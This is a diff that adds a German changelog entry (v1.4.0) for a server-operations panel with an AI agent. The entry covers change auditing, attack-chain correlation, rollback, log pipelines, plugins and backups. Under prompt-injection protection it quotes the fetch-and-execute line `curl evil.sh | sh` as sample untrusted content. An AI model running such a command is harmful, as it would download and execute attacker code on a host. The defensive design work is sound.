@@ -2,6 +2,82 @@
 
 Änderungsaufzeichnungen der einzelnen Versionen.
 
+## v1.4.0 (2026-11-02)
+
+**Von „handlungsfähig“ zu „Handeln mit Belegen“**
+
+v1.3 hat den Agenten gelehrt, Probleme selbst zu erkennen und im Rahmen der Grenzen zu handeln. v1.4 ergänzt die andere Seite: **vor dem Handeln erst klären, was passiert ist**, und nach dem Handeln sagen können, was getan wurde und ob es rückgängig gemacht werden kann.
+
+In einem Satz: **Jede Änderung auf dem Host wird protokolliert, bewertet und verknüpft; jede Aktion wird verbucht und ist rückrollbar.**
+
+**Änderungswahrnehmung (neu)**
+
+Der häufigste Satz bei der Betriebsfehlersuche lautet „Ich weiß nicht, was passiert ist, seit es zuletzt in Ordnung war“. Diese Version schließt diese Lücke.
+
+- Sechs Änderungsquellen werden permanent erfasst: Konfigurationsdateien (zeilenweises Diff), Softwarepakete, Dienststatus, Kontoberechtigungen, Firewall-Regeln, geplante Aufgaben
+- Die Zuordnung erfolgt in drei Stufen und wird wahrheitsgemäß angezeigt: `已确认` (konkrete Person identifizierbar) / `推断` (wahrscheinlich wer) / `未知`. Es wird nicht mit dem Wort „System“ übertüncht
+- Jeder Eintrag trägt den Hash des vorherigen und bildet eine **manipulationssichere Kette**, die jederzeit verifiziert werden kann; bei Löschung oder Änderung bricht sie an dieser Stelle
+- Diff wird vor dem Speichern in die Datenbank **maskiert** (`password=`, `api_key=`, private Schlüsselblöcke)
+- **Regelprüfung** vergibt zunächst mit 0 Token eine Bewertung (0–1, mit drei bis fünf Begründungen): kritischer Pfad, ob der Akteur bestätigt werden kann, ob die Quelle öffentlich ist, ob außerhalb der Arbeitszeit, ob zeitgleich Hochrisikoereignisse vorliegen, ob durch den Paketmanager erzeugt … Erst bei Einstufung als verdächtig (≥0.55) wird das Ereignis eskaliert und der Agent geweckt
+- Der Agent erhält das **Original-Diff** für die Tiefenanalyse und gibt „Bewertung / Begründung / Empfehlung“ aus, hat aber **keinerlei Schreibrechte**
+- Bekanntes Rauschen kann über **Ignorierregeln** (mit `**`-Wildcards) ausgeblendet werden; bei Treffer wird nicht einmal ein Ereignis erzeugt
+- Bei Konfigurations- und Kontoänderungen wird ein Snapshot der Originaldatei aufbewahrt, der direkt aus der Detailseite zurückgerollt werden kann; bei Fehlschlag kann erneut zurückgerollt werden
+
+**Angriffskette und Behandlungs-Transaktion (Abschluss des autonomen Regelkreises)**
+
+- **Angriffskette**: „WebShell landet → verdächtiger Prozess → externe Verbindung zur Steuerung“ wird zu einem Eindringling verknüpft, fünf Glieder, gemeinsame Indikatoren + Bewertung zeitlicher Nähe (≥0.45 wird eingegliedert). Bewusst streng gefasst: Einzelnes Brute-Force öffnet keine Kette, Indikatoren und Log-Explosionen werden niemals eingegliedert, **eine Änderung wird nur dann als Glied „Persistenz“ eingegliedert, wenn drei Bedingungen gleichzeitig erfüllt sind**: als verdächtig eingestuft + an einer Position geändert, die einen Neustart übersteht + in der Kette ist bereits Landung oder externe Verbindung aufgetreten
+- **Behandlungs-Transaktion**: Reversible Aktionen (Isolieren/Einfrieren/Sperren/Abschneiden/Snapshot) werden bei fehlgeschlagener Behandlung **automatisch in umgekehrter Reihenfolge zurückgerollt**; irreversible Aktionen werden ausdrücklich mit „N Elemente nicht rückgängig machbar“ aufgeführt, ohne vorzutäuschen, sie seien rückgängig gemacht worden. Im Panel kann eine einzelne Aktion manuell zurückgerollt werden
+- **Shadow-Nachbetrachtung**: Behandlungen, die im Shadow-Modus liefen, werden im Nachhinein anhand der Fakten als `would_help` / `unnecessary` / `unknown` bewertet – aufeinanderfolgende `unnecessary` zeigen, dass die Schwelle angezogen werden sollte, aufeinanderfolgende `would_help` zeigen, dass auf assist hochgestuft werden kann
+- **Feedback-Dämpfung**: Wird dieselbe Ereignisgruppe innerhalb von 7 Tagen zweimal ignoriert, wird der Agent danach nicht mehr geweckt (aber weiterhin protokolliert)
+- **Bei fehlgeschlagener Verifikation automatisch ein Wiederholungsversuch**, wobei die zuletzt blockierte Aktion und das Verifikationsergebnis an das Modell zurückgegeben werden, um dieselbe Annahme zu vermeiden
+- Änderungsseite und Angriffskette sind **in beide Richtungen verlinkt**; jedes Glied der Angriffskette kennzeichnet seine Quelle (WebShell / verdächtiger Prozess / externe Netzwerkverbindung / Änderung)
+
+**Ereignis-Rauschunterdrückung**
+
+Metrik-Alarme und Log-Explosionen werden nun „solange das Ereignis nicht behandelt ist, dauerhaft zusammengefaltet“ – eine CPU-Regel erzeugt nicht mehr über Nacht acht zu behandelnde Einträge. Das Fenster für Anmelde-Anomalien wurde von 1 Stunde auf einen halben Tag erweitert. Tritt ein Ereignis nach seiner Behandlung erneut auf, wird wie gewohnt ein neues erzeugt; Wiederauftreten wird nicht verschluckt.
+
+**Log-Pipeline (neu, standardmäßig deaktiviert)**
+
+Eingebaut ist ein Erfassungs-Ausführungsendpunkt, der **mit der Filebeat-Konfiguration kompatibel** ist; seine Position entspricht dem filebeat auf einem verwalteten Host, es ist jedoch kein separat installierter Prozess erforderlich.
+
+- Aufgabenverzeichnis `tasks.d` (eine Aufgabe pro YAML), die Hauptkonfiguration `main.yml` bestimmt den Ausgang; eine vorhandene filebeat-Konfiguration kann aufgeteilt und direkt verwendet werden
+- **31 Filebeat-Prozessoren**: Feld hinzufügen/entfernen/ändern, JSON/CSV/XML/syslog-Parsing, dissect, script, Fingerprint, Domain und Netzwerkrichtung
+- Drei Ausgaben: Elasticsearch, Kafka, Logstash (Lumberjack v2 + TLS)
+- `at-least-once`: Der Offset wird erst nach erfolgreicher Zustellung vorgerückt, Fehlschläge landen in einer Festplatten-Warteschlange, nach einem Absturz wird ab der bestätigten Position erneut gesendet
+- **Standardmäßig wird kein Log erfasst**: Der Start erfolgt erst, wenn eine Aufgabendatei vorhanden ist, explizit aktiviert wird oder eine von der Plattform übermittelte Aufgabe eingeht
+- Im Panel unter „Protokoll → Pipeline“ sind der Laufzeitstatus, die Leserate pro Aufgabe und der Rückstau einsehbar, und es können **die letzten 20 Ereignisse in Echtzeit in der Vorschau** angezeigt werden – zum Anpassen von Prozessoren muss nicht erst ES abgefragt werden
+
+**Plugin-System (neu)**
+
+Der Kern erledigt nur, was alle Hosts benötigen; Geschäftsfähigkeiten werden an Plugins ausgelagert.
+
+- Plugins sind **eigenständige Prozesse**, die über einen Unix-Socket zeilengetrenntes JSON für Metriken, Ereignisse und Heartbeat melden; ein Absturz beeinträchtigt das Panel nicht
+- Das Paket muss sha256 und ed25519-Signatur mitbringen; bei der Installation werden nacheinander Signatur, `apiVersion`, Plattform und Versionsanforderung geprüft
+- Lebenszyklus: Installation → Aktivierung → Betrieb → Deaktivierung → Upgrade (alte Version bleibt für Rollback erhalten) → Löschen
+- **Ehrliche Anmerkung**: Die Plugins dieser Version laufen unter demselben Benutzer wie das Panel, **ohne** eigenständigen Systembenutzer und cgroup-Beschränkung; `capabilities` ist eine Deklaration, keine Durchsetzung. Die Bedeutung der Signatur ist „Quelle vertrauenswürdig“, nicht „Verhalten sicher“
+- Vor der Installation muss in den Einstellungen ein öffentlicher Schlüssel konfiguriert oder der unsigned-Modus aktiviert werden (nach Änderung ist ein Neustart des Panels erforderlich); offizielle Plugin-Pakete sind noch nicht veröffentlicht, eine leere Plugin-Seite ist der erwartete Zustand
+
+**Sicherung und Wiederherstellung (neu)**
+
+- Drei Sicherungsobjekte: Verzeichnis/Datei, `mysql:库名`, `redis:路径`, `tar.gz` + `manifest.json` (inklusive sha256 pro Segment)
+- Die Sicherung ist echtes Ein-Klick; **die Wiederherstellung nicht**: Vorprüfung → automatischer Snapshot vor der Wiederherstellung → Ausführung → automatischer Rollback bei fehlgeschlagener Gesundheitsprüfung, und der Snapshot-Name muss zur Bestätigung eingegeben werden
+- Die Aufbewahrungsanzahl wird pro gesamtem Verzeichnis bereinigt, einzelne Segmente werden niemals gelöscht
+- Die Sicherung ist **der vierte Typ geplanter Aufgaben** und nutzt dieselbe Engine wie die manuelle Sicherung; Fehlschläge werden in den Aufgabenstatus zurückgeschrieben und lösen den Alarm „Anzahl fehlgeschlagener Sicherungen“ aus
+- Der Code für Remote-Speicher (S3-kompatibel / SFTP) ist fertig, ist aber **in dieser Version nicht Teil der Lieferung**; er wird erst nach manueller Konfiguration in `config.yaml` wirksam und wurde nicht auf echter Hardware abgestimmt
+
+**Sonstiges**
+
+- Alarmregeln 12 → 24, Baseline-Prüfung 13 → 45 Punkte
+- Die Anbindung großer KI-Modelle unterstützt vier Protokolle: OpenAI / Anthropic / Azure / Gemini; die Modellliste kann abgerufen und ausgewählt werden, Modellnamen müssen nicht mehr manuell eingegeben werden
+- **Injektionsschutz** für Agent-Prompts: Nicht vertrauenswürdige Inhalte (Diff-Text, Benutzernamen, Pfade) können keine Absatzgrenzen fälschen oder Code-Fences vorzeitig schließen; der Inhalt selbst wird nicht verändert – `curl evil.sh | sh` muss unverändert an das Modell übergeben werden, er ist die Schlussfolgerung
+- Aggregierte Mitglieder im Ereigniszentrum können zum Anzeigen aller aufgeklappt werden (zuvor wurden nur die ersten angezeigt)
+- Behoben: `/files/du` leerer Pfad dauerte 15 Sekunden, falsche Meldung des Ankers der Änderungskette bei Bestandsdatenbanken, Änderungstabelle auf Mobilgeräten wurde auf ein Zeichen pro Zeile zusammengedrückt
+- Datenverzeichnis vereinheitlicht auf `/data/opsmini`, Deinstallation löscht das Verzeichnis
+
+**Upgrade-Hinweis**
+
+Für das Upgrade von v1.3.x genügt es, das Binary zu ersetzen und neu zu starten; die Datenbank migriert automatisch. Neue Standardrichtlinien wie `change-review` werden idempotent nach Namen ausgesät, auch alte Datenbanken erhalten sie. Log-Pipeline und Plugins sind standardmäßig nicht aktiviert; durch das Upgrade beginnt keine Erfassung und es wird nichts geladen.
+
 ## v1.3.0 (2026-10-28)
 
 **Autonomer Agent: Von „Du fragst, er antwortet" zu „Er behält es selbst im Blick"**
